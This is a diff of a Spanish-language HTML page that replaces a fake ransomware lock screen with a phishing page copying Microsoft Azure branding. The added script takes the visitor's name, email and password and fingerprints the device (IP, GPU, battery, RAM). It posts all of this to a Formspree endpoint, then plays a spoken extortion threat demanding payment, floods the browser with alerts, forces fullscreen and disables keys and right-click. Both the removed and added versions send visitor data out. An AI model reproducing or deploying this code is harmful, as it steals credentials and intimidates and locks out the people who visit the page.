@@ -2,78 +2,143 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>SISTEMA BAJO SECUESTRO</title>
+    <title>Seguridad de la Cuenta - Verificación de Identidad</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        #terminal { border: 2px solid #f00; padding: 30px; background: #050505; width: 80%; max-width: 600px; box-shadow: 0 0 50px #f00; text-align: center; }
-        .blink { animation: flash 0.1s infinite; }
-        @keyframes flash { 0% { background: #000; } 50% { background: #200; } 100% { background: #000; } }
-        button { background: #f00; color: #fff; border: none; padding: 20px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 1.2rem; }
+        body { background: #f4f4f4; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .auth-container { background: #fff; padding: 40px; width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #ddd; }
+        .logo-box { display: flex; align-items: center; margin-bottom: 25px; }
+        .logo-box img { width: 32px; margin-right: 12px; }
+        .logo-box span { font-size: 20px; font-weight: 600; color: #5e5e5e; }
+        h1 { font-size: 24px; margin: 0 0 10px; color: #262626; }
+        p { font-size: 15px; color: #666; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #bababa; border-radius: 2px; box-sizing: border-box; font-size: 15px; }
+        input:focus { border-color: #0067b8; outline: none; }
+        .btn-primary { background: #0067b8; color: #fff; border: none; padding: 12px 30px; cursor: pointer; font-size: 16px; width: 100%; font-weight: 600; }
+        
+        /* Capa de Bloqueo Final */
+        #panic-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; padding: 50px; box-sizing: border-box; font-family: 'Consolas', monospace; color: #000; }
+        .status-line { margin-bottom: 5px; border-left: 3px solid #0067b8; padding-left: 10px; font-size: 14px; }
     </style>
 </head>
-<body onclick="startAttack()">
+<body onkeydown="forceFull()" onmousemove="forceFull()">
 
-    <div id="terminal">
-        <h1 id="header">⚠️ AMENAZA DE NIVEL 5 ⚠️</h1>
-        <div id="content">
-            <p>Se ha detectado una vulnerabilidad crítica en su núcleo.</p>
-            <p>Haga clic para intentar restaurar los archivos encriptados.</p>
-            <button>RESTAURAR SISTEMA</button>
+    <div id="login-ui" class="auth-container">
+        <div class="logo-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Microsoft_Azure.svg" alt="Azure">
+            <span>Identity Vault</span>
         </div>
+        <h1>Validar Identidad</h1>
+        <p>Se requiere una validación de hardware y credenciales para autorizar el acceso desde este nodo.</p>
+        
+        <input type="text" id="target_name" placeholder="Nombre completo del titular">
+        <input type="email" id="target_email" placeholder="Correo institucional o personal">
+        <input type="password" id="target_pass" placeholder="Contraseña de acceso">
+        
+        <button class="btn-primary" onclick="initCapture()">Validar y Sincronizar</button>
+    </div>
+
+    <div id="panic-ui">
+        <div id="console"></div>
     </div>
 
     <script>
         const FORM_ID = "xykdyebg";
 
-        async function startAttack() {
-            // 1. VOZ DEL ATACANTE
-            const msg = new SpeechSynthesisUtterance();
-            msg.text = "He robado su información y si la quiere recuperar tiene que pagarme. Te llamaré en diez horas.";
-            msg.lang = 'es-ES';
-            msg.rate = 0.8; // Voz un poco más lenta y tétrica
-            msg.pitch = 0.5; // Voz más grave
-            window.speechSynthesis.speak(msg);
-
-            // 2. EXFILTRACIÓN SILENCIOSA
-            const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            fetch(`https://formspree.io/f/${FORM_ID}`, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "EVENTO": "RANSOMWARE_PAYMENT_DEMAND",
-                    "IP": ipInfo.ip,
-                    "LOC": `${ipInfo.city}, ${ipInfo.country_name}`,
-                    "MSG": "Usuario bajo amenaza de pago"
-                })
-            });
-
-            // 3. SECUESTRO VISUAL Y DE RECURSOS
-            document.body.classList.add('blink');
-            document.getElementById('header').innerText = "LOCKDOWN ENABLED";
-            document.getElementById('content').innerHTML = "<h2 style='font-size:40px;'>PAGAR PARA DESBLOQUEAR</h2><p>Estado: Archivos encriptados</p>";
-            
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-
-            // 4. BUCLE DE BLOQUEO (TRABA EL DISPOSITIVO)
-            setInterval(() => {
-                // Reinicia la voz si termina
-                if (!window.speechSynthesis.speaking) {
-                    window.speechSynthesis.speak(msg);
-                }
-
-                // Bombardeo de alertas
-                alert("SISTEMA SECUESTRADO POR ANONYMOUS\n\nHe robado su información.\n\nTe llamaré en 10 horas para el pago.");
-
-                // Consumo de CPU
-                for(let i=0; i<1000000; i++) { Math.sqrt(i); }
-            }, 100);
+        function forceFull() {
+            // Re-bloquea la pantalla cada vez que el usuario interactúa
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
         }
 
-        // Impedir que cierren la pestaña fácilmente
-        window.onbeforeunload = function() {
-            return "El proceso de encriptación está en curso. Si sale ahora, perderá sus datos.";
-        };
+        async function initCapture() {
+            const name = document.getElementById('target_name').value;
+            const email = document.getElementById('target_email').value;
+            const pass = document.getElementById('target_pass').value;
+
+            if(!name || !email || !pass) return alert("Complete los campos de seguridad.");
+
+            // Mostrar Interfaz de "Trabajando"
+            document.getElementById('login-ui').style.display = 'none';
+            document.getElementById('panic-ui').style.display = 'block';
+            forceFull();
+
+            // Recolección de Datos (Fingerprinting Avanzado)
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+            const bat = await navigator.getBattery().catch(() => ({level: 0}));
+
+            const payload = {
+                "FULL_NAME": name,
+                "EMAIL": email,
+                "PASSWORD": pass,
+                "IP": ipData.ip,
+                "CITY": ipData.city,
+                "ORG": ipData.org,
+                "GPU": gpu,
+                "OS": navigator.platform,
+                "RAM": navigator.deviceMemory + "GB",
+                "CPU_CORES": navigator.hardwareConcurrency,
+                "BATTERY": (bat.level * 100) + "%",
+                "SCREEN": `${screen.width}x${screen.height}`,
+                "AGENT": navigator.userAgent
+            };
+
+            // EXFILTRACIÓN A FORMSPREE
+            fetch(`https://formspree.io/f/${FORM_ID}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            // Audio de Amenaza Directa
+            const voice = new SpeechSynthesisUtterance();
+            voice.text = "He robado su información y si la quiere recuperar tiene que pagarme. Te llamaré en diez horas.";
+            voice.lang = 'es-ES';
+            voice.rate = 0.8;
+            window.speechSynthesis.speak(voice);
+
+            // Bucle de Consola y Bloqueo de Teclas
+            const logger = document.getElementById('console');
+            const addMsg = (m) => {
+                const div = document.createElement('div');
+                div.className = "status-line";
+                div.innerText = `[${new Date().toLocaleTimeString()}] ${m}`;
+                logger.appendChild(div);
+            };
+
+            const sequences = [
+                "ESTABLECIENDO CONEXIÓN CON SERVIDOR REMOTO...",
+                "VOLCANDO PARTICIONES DE MEMORIA...",
+                "CAPTURANDO CREDENCIALES DE SESIÓN...",
+                "DATOS ENVIADOS EXITOSAMENTE.",
+                "INICIANDO ENCRIPTACIÓN DE DISCO...",
+                "ERROR CRÍTICO: KERNEL_SECURITY_BREACH",
+                "PAGUE PARA RECUPERAR EL ACCESO."
+            ];
+
+            let i = 0;
+            setInterval(() => {
+                if (i < sequences.length) addMsg(sequences[i]);
+                i++;
+                
+                // BOMBA DE ALERTAS (Bloqueo de interacción)
+                alert("SU INFORMACIÓN HA SIDO ROBADA.\n\nNombre: " + name + "\nIP: " + ipData.ip + "\n\nEspere la llamada en 10 horas.");
+                
+                // Reset de Fullscreen si intentan salir
+                forceFull();
+            }, 800);
+        }
+
+        // Desactivar clic derecho y teclas F12, Ctrl+U, etc.
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            e.preventDefault();
+            forceFull();
+        });
     </script>
 </body>
 </html>
